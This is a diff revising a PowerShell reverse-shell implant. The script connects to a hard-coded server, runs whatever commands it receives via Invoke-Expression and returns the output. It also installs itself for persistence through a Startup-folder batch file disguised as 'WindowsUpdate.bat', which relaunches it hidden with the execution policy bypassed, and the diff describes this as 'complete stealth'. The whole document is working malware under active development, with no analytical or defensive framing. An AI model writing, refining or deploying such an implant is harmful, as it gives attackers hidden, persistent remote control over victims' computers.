@@ -12,92 +12,88 @@ if ((Get-ExecutionPolicy -Scope Process) -ne 'Bypass') {
 try {
     # Create temp script with current content
     $scriptContent = @'
-    # Set execution policy
+    # Set execution policy and assemblies
     if ((Get-ExecutionPolicy -Scope Process) -ne 'Bypass') { Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force }
+    Add-Type -AssemblyName System.Windows.Forms
+    Add-Type -AssemblyName System.Drawing
 
     # Connection settings
     $server_ip = "192.168.100.6"
     $server_port = 4455
 
-    # Import required assemblies
-    Add-Type -AssemblyName System.Windows.Forms
-    Add-Type -AssemblyName System.Drawing
-
-    # Hide PowerShell window
-    $code = @"
-    using System;
-    using System.Runtime.InteropServices;
-    public class Win32 {
-        [DllImport("user32.dll")]
-        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-        [DllImport("kernel32.dll")]
-        public static extern IntPtr GetConsoleWindow();
+    # Check for admin privileges
+    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+    if (-not $isAdmin) {
+        Write-Warning "Not running with administrative privileges"
     }
-"@
-    Add-Type -TypeDefinition $code
-    $hwnd = [Win32]::GetConsoleWindow()
-    [Win32]::ShowWindow($hwnd, 0)
 
-    # Connection loop
+    # Connection and handler functions
+    function Connect-ToServer {
+        param ($server_ip, $server_port)
+        while ($true) {
+            try {
+                $client = New-Object System.Net.Sockets.TCPClient
+                $client.SendTimeout = 30000
+                $client.ReceiveTimeout = 30000
+                $result = $client.BeginConnect($server_ip, $server_port, $null, $null)
+                $success = $result.AsyncWaitHandle.WaitOne(5000)
+                if (!$success) { throw "Timeout" }
+                $client.EndConnect($result)
+                $stream = $client.GetStream()
+                
+                # Send system info
+                $hostname = [System.Net.Dns]::GetHostName()
+                $username = "$env:COMPUTERNAME\$env:USERNAME"
+                $buffer = New-Object byte[] 1024
+                $read = $stream.Read($buffer, 0, $buffer.Length)
+                if ([System.Text.Encoding]::UTF8.GetString($buffer, 0, $read).Trim() -eq "whoami") {
+                    $stream.Write([System.Text.Encoding]::UTF8.GetBytes($username), 0, $username.Length)
+                }
+                return $client, $stream
+            } catch {
+                if ($client) { $client.Close() }
+                Start-Sleep -Seconds 5
+            }
+        }
+    }
+
+    # Main reverse shell loop
     while ($true) {
         try {
-            $client = New-Object System.Net.Sockets.TCPClient($server_ip, $server_port)
-            $stream = $client.GetStream()
-            
-            # Send system info
-            $computerName = $env:COMPUTERNAME
-            $userName = $env:USERNAME
-            $systemInfo = "$computerName\$userName"
-            
-            # Receive whoami command and respond
-            $buffer = New-Object byte[] 1024
-            $read = $stream.Read($buffer, 0, $buffer.Length)
-            $command = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $read)
-            
-            if ($command.Trim() -eq "whoami") {
-                $bytes = [System.Text.Encoding]::UTF8.GetBytes($systemInfo)
-                $stream.Write($bytes, 0, $bytes.Length)
-            }
-            
-            # Main command handling loop
-            while ($client.Connected) {
-                try {
-                    $command = ""
-                    $buffer = New-Object byte[] 1024
-                    
-                    do {
-                        $read = $stream.Read($buffer, 0, $buffer.Length)
-                        $command += [System.Text.Encoding]::UTF8.GetString($buffer, 0, $read)
-                    } while ($stream.DataAvailable)
-                    
-                    if ($command.Length -gt 0) {
+            $client, $stream = Connect-ToServer $server_ip $server_port
+            if ($client.Connected) {
+                $buffer = New-Object byte[] 1024
+                $last_activity = Get-Date
+                
+                while ($true) {
+                    if ($client.Available -gt 0) {
+                        $bytes_read = $stream.Read($buffer, 0, $buffer.Length)
+                        if ($bytes_read -eq 0) { break }
+                        
+                        $command = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $bytes_read).Trim()
+                        $last_activity = Get-Date
+
                         try {
-                            $output = Invoke-Expression $command 2>&1 | Out-String
-                            $bytes = [System.Text.Encoding]::UTF8.GetBytes($output)
-                            $stream.Write($bytes, 0, $bytes.Length)
+                            $output = Invoke-Expression -Command $command 2>&1
+                            $output_bytes = [System.Text.Encoding]::UTF8.GetBytes($output)
+                            $stream.Write($output_bytes, 0, $output_bytes.Length)
+                        } catch {
+                            $error_bytes = [System.Text.Encoding]::UTF8.GetBytes($_.Exception.Message)
+                            $stream.Write($error_bytes, 0, $error_bytes.Length)
                         }
-                        catch {
-                            $errorMsg = $_.Exception.Message
-                            $bytes = [System.Text.Encoding]::UTF8.GetBytes($errorMsg)
-                            $stream.Write($bytes, 0, $bytes.Length)
+                    } else {
+                        if (($current_time - $last_activity).TotalSeconds -gt 30) {
+                            $client.Client.Send([byte[]]@(0), 0, 0)
                         }
+                        Start-Sleep -Milliseconds 100
                     }
                 }
-                catch {
-                    break
-                }
             }
-        }
-        catch {
-            Start-Sleep -Seconds 5
-            continue
-        }
-        finally {
+        } catch {
             if ($client) { $client.Close() }
             if ($stream) { $stream.Close() }
+            Start-Sleep -Seconds 5
         }
-        
-        Start-Sleep -Seconds 5
     }
 '@
     
@@ -107,31 +103,34 @@ try {
     $startupPath = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")
     $batPath = Join-Path $startupPath "WindowsUpdate.bat"
 
-    # Create directory structure recursively
-    if (-not (Test-Path $persistPath)) {
-        New-Item -ItemType Directory -Path $persistPath -Force -ErrorAction Stop | Out-Null
-    }
-
-    # Create or update script file
-    if (-not (Test-Path $scriptPath) -or -not (Get-Content $scriptPath -Raw)) {
-        # For IRM execution, use current script content
-        if ($MyInvocation.MyCommand.Path) {
-            Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $scriptPath -Force
-        } else {
-            # For IRM, use script content
-            Set-Content -Path $scriptPath -Value $scriptContent -Force
+    # Create directory structure recursively with proper error handling
+    foreach ($path in @($persistPath, $startupPath)) {
+        if (-not (Test-Path $path)) {
+            New-Item -ItemType Directory -Path $path -Force -ErrorAction Stop | Out-Null
         }
     }
 
-    # Create batch file with error handling
+    # Create script file first
+    if (-not (Test-Path $scriptPath) -or -not (Get-Content $scriptPath -Raw)) {
+        if ($MyInvocation.MyCommand.Path) {
+            Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $scriptPath -Force -ErrorAction Stop
+        } else {
+            Set-Content -Path $scriptPath -Value $scriptContent -Force -ErrorAction Stop
+        }
+    }
+
+    # Create batch file with error handling - modified for complete stealth
     $batContent = @"
 @echo off
-PowerShell -WindowStyle Hidden -ExecutionPolicy Bypass -File "$scriptPath"
+if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& {Start-Process powershell -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -File \`"$scriptPath\`"' -WindowStyle Hidden}"
 exit
 "@
-    [System.IO.File]::WriteAllText($batPath, $batContent)
+    Set-Content -Path $batPath -Value $batContent -Force -ErrorAction Stop
 
-    # Only hide the parent directory
+    # Hide files with validation
+    #if (Test-Path $scriptPath) { (Get-Item $scriptPath -Force).Attributes = 'Hidden' }
+    #if (Test-Path $batPath) { (Get-Item $batPath -Force).Attributes = 'Hidden' }
     if (Test-Path $persistPath) { (Get-Item $persistPath -Force).Attributes = 'Hidden' }
 
     # Start hidden if not already running from persist location
